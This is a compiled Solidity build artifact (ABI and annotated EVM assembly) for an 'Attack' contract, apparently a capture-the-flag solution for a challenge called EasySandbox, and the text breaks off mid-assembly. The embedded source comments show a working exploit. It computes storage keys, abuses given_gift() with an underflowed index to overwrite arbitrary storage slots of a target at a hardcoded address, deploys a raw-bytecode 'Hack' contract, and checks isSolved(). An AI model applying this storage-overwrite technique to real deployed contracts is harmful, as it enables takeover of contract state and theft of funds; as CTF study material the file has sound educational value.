{
	"EasySandBox/Attack.sol": {
		"Attack": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "position",
							"type": "uint256"
						}
					],
					"name": "calculateKey",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "uint256",
							"name": "position",
							"type": "uint256"
						}
					],
					"name": "calculateSlot",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"EasySandBox/Attack.sol\":4442:4484  0x5FD6eB55D12E759a21C09eF703fe0CBa1DC9d88D */\n  0x5fd6eb55d12e759a21c09ef703fe0cba1dc9d88d\n    /* \"EasySandBox/Attack.sol\":4402:4485  IEasySandbox easySandbox = IEasySandbox(0x5FD6eB55D12E759a21C09eF703fe0CBa1DC9d88D) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x603a9aec\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6414862f\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"EasySandBox/Attack.sol\":5721:5952  function calculateKey(address owner, uint256 position) public pure returns(bytes32) {... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_7:\n        /* \"EasySandBox/Attack.sol\":5721:5952  function calculateKey(address owner, uint256 position) public pure returns(bytes32) {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_8\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"EasySandBox/Attack.sol\":5958:6149  function calculateSlot(uint256 position) public pure returns(bytes32){... */\n    tag_4:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"EasySandBox/Attack.sol\":5958:6149  function calculateSlot(uint256 position) public pure returns(bytes32){... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"EasySandBox/Attack.sol\":4492:5715  function attack() public {... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"EasySandBox/Attack.sol\":5721:5952  function calculateKey(address owner, uint256 position) public pure returns(bytes32) {... */\n    tag_8:\n        /* \"EasySandBox/Attack.sol\":5796:5803  bytes32 */\n      0x00\n        /* \"EasySandBox/Attack.sol\":5895:5900  owner */\n      dup3\n        /* \"EasySandBox/Attack.sol\":5887:5901  uint256(owner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5879:5902  bytes32(uint256(owner)) */\n      0x00\n      shl\n        /* \"EasySandBox/Attack.sol\":5912:5920  position */\n      dup3\n        /* \"EasySandBox/Attack.sol\":5904:5921  bytes32(position) */\n      0x00\n      shl\n        /* \"EasySandBox/Attack.sol\":5845:5935  abi.encodePacked(... */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"EasySandBox/Attack.sol\":5845:5935  abi.encodePacked(... */\n      swap1\n      0x40\n      mstore\n        /* \"EasySandBox/Attack.sol\":5822:5945  keccak256(... */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"EasySandBox/Attack.sol\":5815:5945  return keccak256(... */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5721:5952  function calculateKey(address owner, uint256 position) public pure returns(bytes32) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"EasySandBox/Attack.sol\":5958:6149  function calculateSlot(uint256 position) public pure returns(bytes32){... */\n    tag_11:\n        /* \"EasySandBox/Attack.sol\":6019:6026  bytes32 */\n      0x00\n        /* \"EasySandBox/Attack.sol\":6109:6117  position */\n      dup2\n        /* \"EasySandBox/Attack.sol\":6101:6118  bytes32(position) */\n      0x00\n      shl\n        /* \"EasySandBox/Attack.sol\":6067:6132  abi.encodePacked(... */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"EasySandBox/Attack.sol\":6067:6132  abi.encodePacked(... */\n      swap1\n      0x40\n      mstore\n        /* \"EasySandBox/Attack.sol\":6044:6142  keccak256(... */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"EasySandBox/Attack.sol\":6037:6142  return keccak256(... */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5958:6149  function calculateSlot(uint256 position) public pure returns(bytes32){... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"EasySandBox/Attack.sol\":4492:5715  function attack() public {... */\n    tag_13:\n        /* \"EasySandBox/Attack.sol\":4527:4540  address owner */\n      0x00\n        /* \"EasySandBox/Attack.sol\":4543:4554  easySandbox */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":4543:4560  easySandbox.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"EasySandBox/Attack.sol\":4543:4562  easySandbox.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_17:\n        /* \"EasySandBox/Attack.sol\":4543:4562  easySandbox.owner() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"EasySandBox/Attack.sol\":4543:4562  easySandbox.owner() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_19:\n        /* \"EasySandBox/Attack.sol\":4543:4562  easySandbox.owner() */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"EasySandBox/Attack.sol\":4527:4562  address owner = easySandbox.owner() */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":4572:4584  bytes32 key1 */\n      0x00\n        /* \"EasySandBox/Attack.sol\":4587:4609  calculateKey(owner, 1) */\n      tag_20\n        /* \"EasySandBox/Attack.sol\":4600:4605  owner */\n      dup3\n        /* \"EasySandBox/Attack.sol\":4607:4608  1 */\n      0x01\n        /* \"EasySandBox/Attack.sol\":4587:4599  calculateKey */\n      tag_8\n        /* \"EasySandBox/Attack.sol\":4587:4609  calculateKey(owner, 1) */\n      jump\t// in\n    tag_20:\n        /* \"EasySandBox/Attack.sol\":4572:4609  bytes32 key1 = calculateKey(owner, 1) */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":4619:4631  bytes32 key2 */\n      0x00\n        /* \"EasySandBox/Attack.sol\":4661:4665  key1 */\n      dup2\n        /* \"EasySandBox/Attack.sol\":4644:4666  abi.encodePacked(key1) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"EasySandBox/Attack.sol\":4644:4666  abi.encodePacked(key1) */\n      swap1\n      0x40\n      mstore\n        /* \"EasySandBox/Attack.sol\":4634:4667  keccak256(abi.encodePacked(key1)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"EasySandBox/Attack.sol\":4619:4667  bytes32 key2 = keccak256(abi.encodePacked(key1)) */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5074:5090  uint256 MAX_SLOT */\n      0x00\n        /* \"EasySandBox/Attack.sol\":5093:5159  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"EasySandBox/Attack.sol\":5074:5159  uint256 MAX_SLOT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5169:5188  uint256 WRITES_SLOT */\n      0x00\n        /* \"EasySandBox/Attack.sol\":5191:5257  0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 */\n      0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563\n        /* \"EasySandBox/Attack.sol\":5169:5257  uint256 WRITES_SLOT = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5267:5281  uint256 SLOT_0 */\n      0x00\n        /* \"EasySandBox/Attack.sol\":5309:5310  1 */\n      0x01\n        /* \"EasySandBox/Attack.sol\":5295:5306  WRITES_SLOT */\n      dup3\n        /* \"EasySandBox/Attack.sol\":5284:5292  MAX_SLOT */\n      dup5\n        /* \"EasySandBox/Attack.sol\":5284:5306  MAX_SLOT - WRITES_SLOT */\n      sub\n        /* \"EasySandBox/Attack.sol\":5284:5310  MAX_SLOT - WRITES_SLOT + 1 */\n      add\n        /* \"EasySandBox/Attack.sol\":5267:5310  uint256 SLOT_0 = MAX_SLOT - WRITES_SLOT + 1 */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5344:5355  easySandbox */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5344:5366  easySandbox.given_gift */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x5e08b9d5\n        /* \"EasySandBox/Attack.sol\":5367:5368  2 */\n      0x02\n        /* \"EasySandBox/Attack.sol\":5386:5397  WRITES_SLOT */\n      dup5\n        /* \"EasySandBox/Attack.sol\":5378:5382  key1 */\n      dup9\n        /* \"EasySandBox/Attack.sol\":5370:5383  uint256(key1) */\n      0x00\n      shr\n        /* \"EasySandBox/Attack.sol\":5370:5397  uint256(key1) - WRITES_SLOT */\n      sub\n        /* \"EasySandBox/Attack.sol\":5344:5398  easySandbox.given_gift(2, uint256(key1) - WRITES_SLOT) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"EasySandBox/Attack.sol\":5344:5398  easySandbox.given_gift(2, uint256(key1) - WRITES_SLOT) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"EasySandBox/Attack.sol\":5344:5398  easySandbox.given_gift(2, uint256(key1) - WRITES_SLOT) */\n      pop\n      pop\n      pop\n      pop\n        /* \"EasySandBox/Attack.sol\":5469:5480  easySandbox */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5469:5491  easySandbox.given_gift */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x5e08b9d5\n        /* \"EasySandBox/Attack.sol\":5508:5512  this */\n      address\n        /* \"EasySandBox/Attack.sol\":5492:5514  uint256(address(this)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5546:5547  1 */\n      0x01\n        /* \"EasySandBox/Attack.sol\":5532:5543  WRITES_SLOT */\n      dup6\n        /* \"EasySandBox/Attack.sol\":5524:5528  key2 */\n      dup9\n        /* \"EasySandBox/Attack.sol\":5516:5529  uint256(key2) */\n      0x00\n      shr\n        /* \"EasySandBox/Attack.sol\":5516:5543  uint256(key2) - WRITES_SLOT */\n      sub\n        /* \"EasySandBox/Attack.sol\":5516:5547  uint256(key2) - WRITES_SLOT + 1 */\n      add\n        /* \"EasySandBox/Attack.sol\":5469:5548  easySandbox.given_gift(uint256(address(this)), uint256(key2) - WRITES_SLOT + 1) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_23:\n        /* \"EasySandBox/Attack.sol\":5469:5548  easySandbox.given_gift(uint256(address(this)), uint256(key2) - WRITES_SLOT + 1) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"EasySandBox/Attack.sol\":5469:5548  easySandbox.given_gift(uint256(address(this)), uint256(key2) - WRITES_SLOT + 1) */\n      pop\n      pop\n      pop\n      pop\n        /* \"EasySandBox/Attack.sol\":5559:5568  Hack hack */\n      0x00\n        /* \"EasySandBox/Attack.sol\":5571:5581  new Hack() */\n      mload(0x40)\n      tag_25\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create\n      dup1\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_27:\n        /* \"EasySandBox/Attack.sol\":5571:5581  new Hack() */\n      pop\n        /* \"EasySandBox/Attack.sol\":5559:5581  Hack hack = new Hack() */\n      swap1\n      pop\n        /* \"EasySandBox/Attack.sol\":5591:5602  easySandbox */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5591:5615  easySandbox.easy_sandbox */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc94103b1\n        /* \"EasySandBox/Attack.sol\":5624:5628  hack */\n      dup3\n        /* \"EasySandBox/Attack.sol\":5591:5630  easySandbox.easy_sandbox(address(hack)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_28:\n        /* \"EasySandBox/Attack.sol\":5591:5630  easySandbox.easy_sandbox(address(hack)) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_29\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_29:\n        /* \"EasySandBox/Attack.sol\":5591:5630  easySandbox.easy_sandbox(address(hack)) */\n      pop\n      pop\n      pop\n      pop\n        /* \"EasySandBox/Attack.sol\":5675:5679  true */\n      0x01\n        /* \"EasySandBox/Attack.sol\":5649:5679  easySandbox.isSolved() == true */\n      iszero\n      iszero\n        /* \"EasySandBox/Attack.sol\":5649:5660  easySandbox */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"EasySandBox/Attack.sol\":5649:5669  easySandbox.isSolved */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x64d98f6e\n        /* \"EasySandBox/Attack.sol\":5649:5671  easySandbox.isSolved() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_30:\n        /* \"EasySandBox/Attack.sol\":5649:5671  easySandbox.isSolved() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_31\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_31:\n        /* \"EasySandBox/Attack.sol\":5649:5671  easySandbox.isSolved() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n        /* \"EasySandBox/Attack.sol\":5649:5671  easySandbox.isSolved() */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"EasySandBox/Attack.sol\":5649:5679  easySandbox.isSolved() == true */\n      iszero\n      iszero\n      eq\n        /* \"EasySandBox/Attack.sol\":5641:5708  require(easySandbox.isSolved() == true, \"didn't hack successfully\") */\n      tag_33\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x18\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x6469646e2774206861636b207375636365737366756c6c790000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_33:\n        /* \"EasySandBox/Attack.sol\":4492:5715  function attack() public {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"EasySandBox/Attack.sol\":4380:6151  contract Attack {... */\n    tag_26:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"EasySandBox/Attack.sol\":2633:4151  contract Hack {... */\n          mstore(0x40, 0x80)\n            /* \"EasySandBox/Attack.sol\":2653:4149  constructor() public {... */\n          callvalue\n            /* \"--CODEGEN--\":8:17   */\n          dup1\n            /* \"--CODEGEN--\":5:7   */\n          iszero\n          tag_1\n          jumpi\n            /* \"--CODEGEN--\":30:31   */\n          0x00\n            /* \"--CODEGEN--\":27:28   */\n          dup1\n            /* \"--CODEGEN--\":20:32   */\n          revert\n            /* \"--CODEGEN--\":5:7   */\n        tag_1:\n            /* \"EasySandBox/Attack.sol\":2653:4149  constructor() public {... */\n          pop\n            /* \"EasySandBox/Attack.sol\":3852:3918  0x6000805560016101007f36306db541fd1551fd93a60031e8a8c89d69ddef41d6 */\n          